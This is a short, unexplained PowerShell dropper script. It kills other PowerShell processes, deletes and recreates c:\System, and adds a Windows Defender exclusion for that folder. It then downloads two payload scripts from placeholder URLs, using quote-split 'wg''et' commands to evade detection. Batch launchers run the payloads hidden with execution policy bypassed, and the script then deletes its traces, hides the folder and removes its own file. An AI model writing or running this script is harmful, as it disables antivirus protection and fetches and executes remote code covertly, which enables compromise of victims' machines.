cd /;
get-process powershell | where-object {$_.id -ne $pid} | stop-process -force;
remove-item "c:\System" -recurse -force;
mkdir \System;
add-mppreference -exclusionpath 'c:\System';
cd System;
start-sleep -seconds 3;
wg''et ">>URL1<<" -OutFile pyld_rv.p''s1;
start-sleep -seconds 3;
wg''et ">>URL2<<" -OutFile pyld_ds.p''s1;
'(cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy ByPass -File "c:/System/pyld_rv.ps1")' | Out-File init_rv.bat -Encoding ascii;
'(cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy ByPass -File "c:/System/pyld_ds.ps1")' | Out-File init_ds.bat -Encoding ascii;
.\init_rv.bat;
start-sleep -seconds 3;
rm init_rv.bat -force;
rm pyld_rv.ps1;
attrib +h;
attrib +h .;
powershell rm ~/w.ps1 -Force;
exit;
